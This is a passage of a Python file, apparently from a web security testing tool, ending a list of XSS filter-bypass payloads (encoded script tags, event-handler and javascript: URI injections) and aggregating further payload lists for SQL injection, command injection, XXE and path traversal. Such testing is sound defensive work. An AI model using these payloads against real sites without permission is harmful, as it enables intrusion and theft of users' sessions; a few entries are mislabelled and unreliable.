        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        "Unicode escape XSS"),
    BypassPayload("xss-enc-004", BypassTargetType.XSS_BYPASS,
        "JavaScript escape",
        '\x3cscript\x3ealert(1)\x3c/script\x3e',
        "JS escape sequence XSS"),
    BypassPayload("xss-enc-005", BypassTargetType.XSS_BYPASS,
        "Octal escape",
        '\154\151\153\145\055\155\145\163\163\141\147\145',
        "Octal-encoded 'likemessage'"),
    # Advanced
    BypassPayload("xss-adv-001", BypassTargetType.XSS_BYPASS,
        "img onerror no quotes",
        '<img src=javascript:alert(1)>',
        "No-quote img onerror"),
    BypassPayload("xss-adv-002", BypassTargetType.XSS_BYPASS,
        "form action",
        '<form action="javascript:alert(1)"><input type=submit>',
        "form action javascript:"),
    BypassPayload("xss-adv-003", BypassTargetType.XSS_BYPASS,
        "details open",
        '<details open ontoggle=alert(1)>',
        "details toggle event XSS"),
    BypassPayload("xss-adv-004", BypassTargetType.XSS_BYPASS,
        "video onerror",
        '<video><source onerror="javascript:alert(1)">',
        "video source onerror"),
    BypassPayload("xss-adv-005", BypassTargetType.XSS_BYPASS,
        "audio onerror",
        '<audio src=x onerror=alert(1)>',
        "audio onerror XSS"),
    BypassPayload("xss-adv-006", BypassTargetType.XSS_BYPASS,
        "marquee onstart",
        '<marquee onstart=alert(1)>',
        "marquee start event"),
    BypassPayload("xss-adv-007", BypassTargetType.XSS_BYPASS,
        "math maction",
        '<math><maction annotation-xml=src=http://h7.vt>click</maction>',
        "MathML external resource"),
    BypassPayload("xss-adv-008", BypassTargetType.XSS_BYPASS,
        "embed src",
        '<embed src="javascript:alert(1)">',
        "embed javascript XSS"),
]


# ── Aggregation ───────────────────────────────────────────────────────────────

ALL_BYPASS_PAYLOADS: list[BypassPayload] = (
    HEADER_INJECTION_PAYLOADS
    + XXE_PAYLOADS
    + CMDI_PAYLOADS
    + PATH_TRAVERSAL_PAYLOADS
    + HTTP_PP_PAYLOADS
    + ENCODING_EVASION_PAYLOADS
    + SQLI_BYPASS_PAYLOADS
    + XSS_BYPASS_PAYLOADS
)


# ── Bypass payload helper ─────────────────────────────────────────────────────

def get_payloads_by_type(bypass_type: BypassTargetType) -> list[BypassPayload]:
    """Get all bypass payloads for a given type.

    Args:
        bypass_type: The bypass target type.

    Returns:
        List of BypassPayload for the given type.
    """
    type_map = {
        BypassTargetType.HEADER_INJECTION: HEADER_INJECTION_PAYLOADS,
        BypassTargetType.XXE: XXE_PAYLOADS,
        BypassTargetType.COMMAND_INJECTION: CMDI_PAYLOADS,
        BypassTargetType.PATH_TRAVERSAL: PATH_TRAVERSAL_PAYLOADS,
        BypassTargetType.HTTP_PARAM_POLLUTION: HTTP_PP_PAYLOADS,
        BypassTargetType.ENCODING_EVASION: ENCODING_EVASION_PAYLOADS,
        BypassTargetType.SQLI_BYPASS: SQLI_BYPASS_PAYLOADS,
        BypassTargetType.XSS_BYPASS: XSS_BYPASS_PAYLOADS,
    }
    return type_map.get(bypass_type, [])


def get_all_bypass_payloads() -> list[BypassPayload]:
    """Return all bypass payloads.

    Returns:
        List of all BypassPayload entries.
    """
    return ALL_BYPASS_PAYLOADS


def payload_count() -> dict[str, int]:
    """Return count of payloads by type.

    Returns:
        Dict of type -> count.
    """
    counts: dict[str, int] = {}
    for payload in ALL_BYPASS_PAYLOADS:
        counts[payload.type.value] = counts.get(payload.type.value, 0) + 1
    counts["total"] = len(ALL_BYPASS_PAYLOADS)
    return counts
